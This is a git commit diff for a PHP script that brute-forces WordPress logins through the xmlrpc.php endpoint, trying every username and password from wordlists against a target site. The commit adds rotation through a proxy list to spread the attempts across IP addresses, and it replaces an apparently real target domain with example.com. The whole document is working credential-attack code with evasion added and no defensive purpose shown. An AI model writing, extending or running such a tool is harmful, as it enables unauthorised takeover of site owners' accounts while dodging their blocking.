f3165274c51edab78f7592c02e671e47a4e1a519
aza <fake@email.com>
2015-02-13 19:17:38 -0300

    agregando soporte para proxys

--- demi.php
+++ demi.php
@@ -1,18 +1,18 @@
 <?php
-
 require 'vendor/autoload.php';
 
-$domain = 'http://edt.org.br';
+$domain = 'http://example.com';
 $endpoint = $domain . "/xmlrpc.php";
 
 $users_file = 'users.txt';
 $passwords_file = 'passwords.txt';
-
+$proxys_file = 'proxys.txt';
 
 $users = file($users_file);
 $passwords = file($passwords_file);
+$proxys = file($proxys_file);
 
-echo "Users file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";
+echo "\nUsers file: $users_file\nPasswords file: $passwords_file\nTarget: $endpoint\n\n";
 
 function is_not_login_error($e) {
   if ( strpos($e->getMessage(), 'Usuario') !== false && strpos($e->getMessage(), 'incorrecta') !== false )
@@ -24,13 +24,19 @@ function is_not_login_error($e) {
   return true;
 }
 
+$i = 0;
 foreach ( $users as $user ) {
   foreach ( $passwords as $pass ) {
     $pass = trim($pass);
     $user = trim($user);
-
     # Create client instance
     $wpClient = new \HieuLe\WordpressXmlrpcClient\WordpressClient($endpoint, $user, $pass);
+
+    $p = $i % count($proxys);
+    $i++;
+    $proxy = explode(':',trim($proxys[$p]));
+    $proxy = array('proxy_ip'=>$proxy[0], 'proxy_port'=>$proxy[1]);
+    $wpClient->setProxy($proxy);
 
     try {
       $a = $wpClient->getProfile();
@@ -39,7 +45,9 @@ foreach ( $users as $user ) {
 
     } catch ( Exception $e ) {
       if ( is_not_login_error($e) ) {
-        echo $e->getMessage() . "\n\n";
+        echo "\n" . $e->getMessage() . "\n\n";
+      } else {
+        echo '.';
       }
     }
   }
